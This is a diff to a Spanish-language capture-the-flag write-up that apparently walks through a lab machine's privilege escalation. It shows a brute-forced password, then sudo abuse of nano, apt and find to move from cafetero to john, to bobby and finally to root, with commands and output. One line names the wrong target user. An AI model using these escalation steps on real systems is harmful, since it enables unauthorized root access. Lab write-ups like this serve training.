@@ -157,7 +157,7 @@ Contraseña encontrada para el usuario cafetero: 123123
 Tras probar a hacer fuerza bruta contra el usuario **cafetero**, encontramos sus credenciales.
 Tenemos la contraseña **123123** con la que podemos migrar al usuario **cafetero**
 
-Hacemos **sudo -l** para ver si podemos ejecutar algo como root.
+Hacemos **sudo -l** para ver si podemos ejecutar algo como root o como otro usuario del sistema.
 
 ```shell
 sudo -l
@@ -166,10 +166,10 @@ User cafetero may run the following commands on 8a54f4a7597f:
     (john) NOPASSWD: /usr/bin/nano
 ```
 
-Podemos ejecutar **nano**. Esto es crítico y podemos abusar de este para ejecutar una consola como el usuario root. Si no sabemos como, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)
+Podemos ejecutar **nano**. Esto es crítico y podemos abusar de este para ejecutar una consola como el usuario **john**. Si no sabemos como, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)
 
 ```shell
-sudo nano
+sudo -u john /usr/bin/nano
 ^R^X (Ctrl+R y Ctrl+X)
 reset; sh 1>&0 2>&0
 ```
@@ -182,7 +182,47 @@ Podemos hacer un **clear** para quitar el **nano** y ver bien la consola:
 clear
 whoami
 ----------------
+john
+```
+
+Hemos migrado al usuario **john**. Hacemos **sudo -l** para ver si podemos ejecutar algo como root o como otro usuario del sistema.
+
+```shell
+sudo -l
+---------------------
+User john may run the following commands on 3e1d7f4234cf:
+    (bobby) NOPASSWD: /usr/bin/apt
+```
+
+Podemos ejecutar **apt**. Esto es crítico y podemos abusar de este para ejecutar una consola como el usuario **john**. Si no sabemos como, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)
+
+```shell
+sudo -u bobby /usr/bin/apt changelog apt
+!/bin/bash
+```
+
+```shell
+whoami
+----------------------
+bobby
+```
+
+Hemos conseguido migrar al usuario **bobby**. Hacemos **sudo -l** para ver si podemos ejecutar algo como root o como otro usuario del sistema.
+
+```shell
+sudo -l
+---------------------
+User bobby may run the following commands on 3e1d7f4234cf:
+    (root) NOPASSWD: /usr/bin/find
+```
+
+Podemos ejecutar **find** como **root**. Si no sabemos como, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)
+
+```shell
+sudo find . -exec /bin/sh \; -quit
+whoami
+----------------------------------------
 root
 ```
 
-Hemos alcanzado el nivel de privilegios máximos en la máquina !
+Hemos alcanzado el nivel de privilegios máximo en el sistema !
